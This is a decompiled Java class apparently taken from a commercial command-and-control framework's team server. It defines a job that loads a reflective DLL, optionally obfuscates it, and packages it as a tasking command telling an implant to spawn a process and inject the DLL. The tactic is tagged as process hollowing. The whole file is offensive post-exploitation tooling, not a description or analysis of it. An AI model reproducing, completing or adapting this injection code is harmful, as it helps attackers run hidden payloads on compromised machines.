package beacon;

import common.ReflectiveDLL;
import common.SleevedResource;
import pe.PostExObfuscator;

public abstract class JobSimple {
   protected CommandBuilder builder = new CommandBuilder();
   protected TaskBeacon tasker;
   protected String arch = "";
   protected int pid = 0;

   public JobSimple(TaskBeacon var1) {
      this.tasker = var1;
   }

   public abstract String getDescription();

   public abstract String getShortDescription();

   public abstract String getDLLName();

   public abstract byte[] getArgument();

   public abstract int getWaitTime();

   public boolean ignoreToken() {
      return true;
   }

   public int getCallbackType() {
      return 0;
   }

   public byte[] getDLLContent() {
      return SleevedResource.readResource(this.getDLLName());
   }

   public String getTactic() {
      return "T1093";
   }

   public byte[] fix(byte[] var1) {
      return var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
   }

   public byte[] setupSmartInject(byte[] var1) {
      return !this.tasker.useSmartInject() ? var1 : PostExObfuscator.setupSmartInject(var1);
   }

   public byte[] _obfuscate(byte[] var1) {
      PostExObfuscator var2 = new PostExObfuscator();
      var2.process(var1);
      this.obfuscate(var2, var1);
      return var2.getImage();
   }

   public void spawn(String var1) {
      byte[] var2 = this.getDLLContent();
      int var3 = ReflectiveDLL.findReflectiveLoader(var2);
      if (var3 <= 0) {
         this.tasker.error("Could not find reflective loader in " + this.getDLLName());
      } else {
         if (ReflectiveDLL.is64(var2)) {
            if (this.ignoreToken()) {
               this.builder.setCommand(71);
            } else {
               this.builder.setCommand(88);
            }
         } else if (this.ignoreToken()) {
            this.builder.setCommand(70);
         } else {
            this.builder.setCommand(87);
         }

         var2 = this.fix(var2);
         if (this.tasker.obfuscatePostEx()) {
            var2 = this._obfuscate(var2);
         }

         var2 = this.setupSmartInject(var2);
         byte[] var4 = this.getArgument();
         this.builder.addShort(this.getCallbackType());
         this.builder.addShort(this.getWaitTime());
         this.builder.addInteger(var3);
         this.builder.addLengthAndString(this.getShortDescription());
         this.builder.addInteger(var4.length);
         this.builder.addString(var4);
         this.builder.addString(var2);
         byte[] var5 = this.builder.build();
         this.tasker.task(var1, var5, this.getDescription(), this.getTactic());
      }
   }
}
